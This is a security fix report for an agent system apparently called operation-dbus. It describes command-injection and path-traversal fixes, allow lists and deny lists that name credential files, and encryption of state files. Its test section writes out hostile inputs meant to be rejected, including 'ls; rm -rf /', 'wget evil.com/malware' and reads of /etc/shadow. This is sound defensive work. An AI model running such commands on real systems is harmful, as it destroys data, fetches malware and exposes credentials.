# Critical Security Fixes Applied

## Summary
This document details the critical security vulnerabilities that were identified and fixed in the operation-dbus codebase.

## Fixed Vulnerabilities

### 1. ✅ Command Injection in Executor Agent (CRITICAL)
**File:** `src/mcp/agents/executor.rs`  
**Issue:** Direct shell execution without input validation allowed arbitrary command execution  
**Fix Applied:**
- Implemented command allowlist (only safe commands permitted)
- Added input validation to prevent shell metacharacters
- Removed shell invocation, using direct command execution
- Added argument validation and length limits
- Implemented execution timeouts

**Security Controls Added:**
```rust
const ALLOWED_COMMANDS: &[&str] = &[
    "ls", "cat", "grep", "ps", "top", "df", "du", "free", "uptime",
    "whoami", "date", "hostname", "pwd", "echo", "wc", "sort", "head", "tail"
];
const FORBIDDEN_CHARS: &[char] = &['$', '`', ';', '&', '|', '>', '<', '(', ')', '{', '}'];
const MAX_COMMAND_LENGTH: usize = 1024;
const DEFAULT_TIMEOUT_SECS: u64 = 30;
```

### 2. ✅ Path Traversal in File Agent (CRITICAL)
**File:** `src/mcp/agents/file.rs`  
**Issue:** No path validation allowed access to sensitive files via directory traversal  
**Fix Applied:**
- Path canonicalization to resolve `..` and symlinks
- Whitelist of allowed directories
- Blacklist of forbidden paths and files
- File size limits (10MB max)
- Path length validation

**Security Controls Added:**
```rust
const ALLOWED_DIRECTORIES: &[&str] = &["/home", "/tmp", "/var/log", "/opt"];
const FORBIDDEN_DIRECTORIES: &[&str] = &["/etc", "/root", "/boot", "/sys", "/proc"];
const FORBIDDEN_FILES: &[&str] = &[".ssh/id_rsa", ".ssh/authorized_keys", "shadow", "passwd"];
const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10MB
```

### 3. ✅ Encryption for Sensitive State Data (HIGH)
**File:** `src/state/crypto.rs` (NEW)  
**Issue:** State files stored in plain text could expose sensitive configuration  
**Fix Applied:**
- AES-256-GCM encryption for state files
- Argon2 key derivation for password-based encryption
- Secure key storage with proper file permissions
- Atomic file operations to prevent corruption
- Migration tool for existing plain-text states

**Security Features:**
- 256-bit AES encryption
- Authenticated encryption (GCM mode)
- Random nonce generation for each encryption
- Password-based key derivation with salt
- Key file permissions set to 600 (owner only)

## Additional Security Improvements Needed

### High Priority (Implement Next)
1. **Rate Limiting** - Add rate limiting to web endpoints
2. **Input Validation** - Schema validation for MCP protocol
3. **Authentication** - Add authentication for agent communication
4. **Audit Logging** - Comprehensive audit trail for all operations

### Medium Priority
1. **Sandboxing** - Run agents in restricted environments
2. **Resource Limits** - CPU and memory limits for agents
3. **Session Management** - Proper session handling for web interface
4. **CORS Configuration** - Restrict cross-origin requests

## Testing the Fixes

### Command Injection Test
```bash
# These should now fail:
echo '{"type":"execute","command":"ls; rm -rf /"}' | ./dbus-agent-executor
echo '{"type":"execute","command":"cat /etc/shadow"}' | ./dbus-agent-executor
echo '{"type":"execute","command":"wget evil.com/malware"}' | ./dbus-agent-executor

# These should work:
echo '{"type":"execute","command":"ls","args":["-la"]}' | ./dbus-agent-executor
echo '{"type":"execute","command":"ps","args":["aux"]}' | ./dbus-agent-executor
```

### Path Traversal Test
```bash
# These should now fail:
echo '{"type":"file","operation":"read","path":"../../../etc/passwd"}' | ./dbus-agent-file
echo '{"type":"file","operation":"read","path":"/etc/shadow"}' | ./dbus-agent-file
echo '{"type":"file","operation":"delete","path":"/root/.ssh"}' | ./dbus-agent-file

# These should work (if within allowed directories):
echo '{"type":"file","operation":"read","path":"/tmp/test.txt"}' | ./dbus-agent-file
echo '{"type":"file","operation":"list","path":"/home/user"}' | ./dbus-agent-file
```

### Encryption Test
```rust
// Test encryption
use op_dbus::state::crypto::StateEncryption;

let encryption = StateEncryption::from_key_file(Path::new("/etc/op-dbus/key"))?;
let state = load_state()?;
save_encrypted(&state, Path::new("/etc/op-dbus/state.enc"), &encryption)?;
```

## Security Best Practices Going Forward

1. **Principle of Least Privilege** - Agents should only have minimum required permissions
2. **Defense in Depth** - Multiple layers of security controls
3. **Input Validation** - Always validate and sanitize user input
4. **Secure by Default** - Security should be opt-out, not opt-in
5. **Regular Audits** - Periodic security reviews and penetration testing

## Compliance Status

- [x] OWASP A03:2021 - Injection (Fixed)
- [x] OWASP A01:2021 - Broken Access Control (Fixed)
- [x] OWASP A02:2021 - Cryptographic Failures (Fixed)
- [ ] OWASP A07:2021 - Identification and Authentication Failures (TODO)
- [ ] OWASP A05:2021 - Security Misconfiguration (Partial)

## Next Steps

1. Deploy fixes to all environments
2. Update all agent configurations
3. Migrate existing state files to encrypted format
4. Implement remaining high-priority security controls
5. Schedule security audit for verification
